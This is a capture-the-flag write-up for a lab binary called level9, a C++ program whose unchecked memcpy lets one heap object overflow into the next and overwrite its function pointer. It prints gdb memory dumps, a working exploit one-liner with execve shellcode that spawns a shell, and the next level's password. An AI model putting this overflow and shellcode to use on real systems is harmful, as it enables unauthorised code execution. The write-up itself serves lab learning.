# level9

Nothing of note with `ll` and `checksec`.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|_exit||
|memcpy|main|
|strlen|frame_dummy|
||N::N(int)|
||N::N(int)|
||N::setAnnotation(char*)|
||N::operator+(N&)|
||N::operator-(N&)|


`frame_dummy()` does nothing.

This time we have a C++ program. There does not seem to be an obvious way to access **level10**'s **.pass** file. There is no call to `system()`.

Thus, we'll have to use a **shellcode injection** to open a new shell.

The `main()` function creates two instances of `N`. The first with it's value set to *5* and the second to *6*.
The the first argument is copied to the first instance of `N`.

Let's see where our classes are allocated using using `ltrace ./level9 aaaaaaaa`.
**this** is at `0x804a008` and **this_00** is at `0x804a078`.

If we set a breakpoint at `0x08048690` right before the **this_00** method call, and inspect the memory range of **this** we get this.

```sh
#	'aaaaaaaa' as argument
(gdb) x/40x 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x61616161		# < beginning of `this`, function pointer and beginning of `buffer`
0x804a010:	0x61616161	0x00000000	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000		# < end of `buffer`
0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000		# < `value` < beginning of `this_00`, function pointer and `buffer`
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
```

We can see that the two classe instances are contiguous in memory. This class is comprised of a function pointer to it's `++ operator` `0x08048848`, a string buffer of **100 bytes** and finally an *int*.

And since the `memcpy()` function call is not protected (due to the call to `strlen()`). We can cause an overflow from **this** to **this_00** in order to overwrite call to the `++ operator`.

The tricky part is that **this_00** calls to a function pointer and not a function directly. We will need to overwrite the method call with a pointer to another pointer that calls a function.

Our payload will look like this

|shellcode pointer|shellcode|padding|address of the shellcode pointer|
|-|-|-|-|
|"\x10\xa0\x04\x08"|"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"|"a" * 83|"\x0c\xa0\04\x08"

```sh
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 83 + "\x0c\xa0\04\x08"')

$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

Now onto the bonuses!

```sh
su bonus0
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
